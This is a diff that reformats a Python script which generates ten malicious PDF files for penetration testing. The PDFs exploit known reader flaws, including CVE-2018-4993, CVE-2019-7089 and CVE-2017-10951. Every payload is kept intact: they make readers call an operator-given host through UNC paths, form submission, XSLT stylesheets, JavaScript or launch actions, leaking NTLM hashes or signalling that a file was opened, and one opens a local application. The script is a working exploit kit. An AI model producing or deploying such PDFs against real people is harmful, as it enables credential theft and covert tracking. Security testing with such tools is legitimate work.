@@ -1,41 +1,46 @@
 #!/usr/bin/python
+# flake8: noqa
 # -*- coding: UTF-8 -*-
-##
-## Create different types of malicious PDF files. Used for penetration testing and/or red-teaming etc
-##
-## Usage ./malicious-pdf.py burp-collaborator-url
-##
-## Output will be written as: test1.pdf, test2.pdf, test3.pdf and test4.pdf
-##
-## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
-##
-## Jonas Lejon, 2021 <jonas.github@triop.se> 
-## https://github.com/jonaslejon/malicious-pdf
+#
+# Create different types of malicious PDF files. Used for penetration testing and/or red-teaming etc
+#
+# Usage ./malicious-pdf.py burp-collaborator-url
+#
+# Output will be written as: test1.pdf, test2.pdf, test3.pdf and test4.pdf
+#
+# Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
+#
+# Jonas Lejon, 2021 <jonas.github@triop.se>
+# https://github.com/jonaslejon/malicious-pdf
 
 import sys
+
 if sys.version_info[0] < 3:
     raise SystemExit("Use Python 3 (or higher) only")
 
-import io
 
 # Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
-# Source: https://twitter.com/l33d0hyun/status/1448342241647366152 
+# Source: https://twitter.com/l33d0hyun/status/1448342241647366152
 # This sample contains no phone-home
 def create_malpdf10(filename):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(
+            """%PDF-1.7
 1 0 obj
 <</Pages 1 0 R /OpenAction 2 0 R>>
 2 0 obj
 <</S /JavaScript /JS (
 this.getURL("file:///System/Applications/Calculator.app")
-)>> trailer <</Root 1 0 R>>''')
+)>> trailer <</Root 1 0 R>>"""
+        )
 
-## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
-## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+
+# Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
+# https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
 def create_malpdf9(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(
+            """%PDF-1.7
 
 1 0 obj
   << /Type /Catalog
@@ -89,7 +94,9 @@ endobj
 5 0 obj
   << /Type /Action
      /S /ImportData
-     /F << /Type /FileSpec /F ('''+host+'''/test9.pdf) /V true /FS /URL >>
+     /F << /Type /FileSpec /F ("""
+            + host
+            + """/test9.pdf) /V true /FS /URL >>
   >>
 endobj
 
@@ -108,13 +115,16 @@ trailer
 startxref
 997
 %%EOF
-''')
+"""
+        )
 
-## Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
-## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+
+# Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
+# https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
 def create_malpdf8(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(
+            """%PDF-1.7
 
 1 0 obj
   << /Type /Catalog
@@ -162,7 +172,9 @@ endobj
 5 0 obj
   << /Type /Action
      /S /SubmitForm
-     /F << /Type /FileSpec /F ('''+host+'''/test8.pdf) /V true /FS /URL >>
+     /F << /Type /FileSpec /F ("""
+            + host
+            + """/test8.pdf) /V true /FS /URL >>
      /Flags 4 % SubmitHTML
    % /Flags 32 % SubmitXFDF
    % /Flags 256 % SubmitPDF
@@ -184,13 +196,16 @@ trailer
 startxref
 908
 %%EOF
-''')
+"""
+        )
 
-## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch3.pdf
-## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+
+# Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch3.pdf
+# https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
 def create_malpdf7(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(
+            """%PDF-1.7
 
 1 0 obj
   << /Type /Catalog
@@ -243,7 +258,9 @@ endobj
 5 0 obj
   << /Type /Action
      /S /GoToR
-     /F << /Type /FileSpec /F ('''+host+'''/test7.pdf) /V true /FS /URL >>
+     /F << /Type /FileSpec /F ("""
+            + host
+            + """/test7.pdf) /V true /FS /URL >>
      /NewWindow false
      /D [0 /Fit]
   >>
@@ -264,13 +281,16 @@ trailer
 startxref
 937
 %%EOF
-''')
+"""
+        )
 
-## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch2.pdf
-## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+
+# Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch2.pdf
+# https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
 def create_malpdf6(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(
+            """%PDF-1.7
 
 1 0 obj
   << /Type /Catalog
@@ -323,7 +343,9 @@ endobj
 5 0 obj
   << /Type /Action
      /S /Launch
-     /F << /Type /FileSpec /F (''' + host + '''/test6.pdf) /V true /FS /URL >>
+     /F << /Type /FileSpec /F ("""
+            + host
+            + """/test6.pdf) /V true /FS /URL >>
      /NewWindow false
   >>
 endobj
@@ -343,13 +365,16 @@ trailer
 startxref
 922
 %%EOF
-''')
+"""
+        )
 
-## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch.pdf
-## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+
+# Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch.pdf
+# https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
 def create_malpdf5(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(
+            """%PDF-1.7
 
 1 0 obj
   << /Type /Catalog
@@ -402,7 +427,9 @@ endobj
 5 0 obj
   << /Type /Action
      /S /URI
-     /URI (''' + host + '''/test5)
+     /URI ("""
+            + host
+            + """/test5)
   >>
 endobj
 
@@ -421,13 +448,16 @@ trailer
 startxref
 854
 %%EOF
-''')
+"""
+        )
 
-#a pdf file where javascript code is evaluated for execution
+
+# a pdf file where javascript code is evaluated for execution
 # % BSD Licence, Ange Albertini, 2011
 def create_malpdf3(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.4
+        file.write(
+            '''%PDF-1.4
 1 0 obj
 <<>>
 %endobj
@@ -440,16 +470,21 @@ trailer
       /S/JavaScript
       /JS(
       eval(
-          'app.openDoc({cPath: encodeURI("''' + host +'''"), cFS: "CHTTP" });'
+          'app.openDoc({cPath: encodeURI("'''
+            + host
+            + """"), cFS: "CHTTP" });'
           );
       )
       >>
   >>
->>''')
+>>"""
+        )
+
 
 def create_malpdf2(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1
+        file.write(
+            '''%PDF-1
 1 0 obj <<>>
 stream
 <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
@@ -464,7 +499,9 @@ stream
                <submit
                      textEncoding="UTF-16"
                      xdpContent="pdf datasets xfdf"
-                     target="''' + host + '''"/>
+                     target="'''
+            + host
+            + """"/>
             </event>
 </field>
     </subform>
@@ -488,19 +525,22 @@ trailer <<
         >>
         /Pages <<>>
     >>
->>''')
+>>"""
+        )
+
 
 # Adobe Reader - PDF callback via XSLT stylesheet in XFA
 # CVE-2019-7089
 # From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
 def create_malpdf4(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-
+        file.write(
+            f"""%PDF-
 
 1 0 obj <<>>
 stream
 <?xml version="1.0" ?>
-<?xml-stylesheet href="\\''' + host + '''\whatever.xslt" type="text/xsl" ?>
+<?xml-stylesheet href="\\{host}\\whatever.xslt" type="text/xsl" ?>
 endstream
 endobj
 trailer <<
@@ -521,14 +561,16 @@ trailer <<
         /Pages <<>>
     >>
 >>
-''')
+"""
+        )
 
 
 # This is CVE-2018-4993
 # From https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
 def create_malpdf(filename, host):
     with open(filename, "w") as file:
-        file.write('''%PDF-1.7
+        file.write(
+            f"""%PDF-1.7
 
 1 0 obj
 <</Type/Catalog/Pages 2 0 R>>
@@ -555,7 +597,7 @@ startxref
 
    /AA <<
 	   /O <<
-	      /F (''' + host + ''')
+	      /F ({host})
 		  /D [ 0 /Fit]
 		  /S /GoToE
 		  >>
@@ -594,29 +636,30 @@ trailer
 >>
 
 %%EOF
-''')
+"""
+        )
 
 
 if __name__ == "__main__":
 
-  try:
-    host = sys.argv[1]
-  except IndexError as e:
-      print("Usage: {} phone-home-url-without-http-prefix".format(sys.argv[0]))
-      sys.exit(1)
+    try:
+        host = sys.argv[1]
+    except IndexError:
+        print("Usage: {} phone-home-url-without-http-prefix".format(sys.argv[0]))
+        sys.exit(1)
 
-  print("Creating PDF files..")
+    print("Creating PDF files..")
 
-  create_malpdf("test1.pdf", '\\\\' + '\\\\'  + host + '\\\\' )
-  create_malpdf("test1bis.pdf", 'https://' + host)
-  create_malpdf2("test2.pdf", 'https://' + host)
-  create_malpdf3("test3.pdf", 'https://' + host)
-  create_malpdf4("test4.pdf", 'https://' + host)
-  create_malpdf5("test5.pdf", 'https://' + host)
-  create_malpdf6("test6.pdf", 'https://' + host)
-  create_malpdf7("test7.pdf", 'https://' + host)
-  create_malpdf8("test8.pdf", 'https://' + host)
-  create_malpdf9("test9.pdf", 'https://' + host)
-  create_malpdf10("test10.pdf")
+    create_malpdf("test1.pdf", "\\\\" + "\\\\" + host + "\\\\")
+    create_malpdf("test1bis.pdf", "https://" + host)
+    create_malpdf2("test2.pdf", "https://" + host)
+    create_malpdf3("test3.pdf", "https://" + host)
+    create_malpdf4("test4.pdf", "https://" + host)
+    create_malpdf5("test5.pdf", "https://" + host)
+    create_malpdf6("test6.pdf", "https://" + host)
+    create_malpdf7("test7.pdf", "https://" + host)
+    create_malpdf8("test8.pdf", "https://" + host)
+    create_malpdf9("test9.pdf", "https://" + host)
+    create_malpdf10("test10.pdf")
 
-  print("Done.")
+    print("Done.")
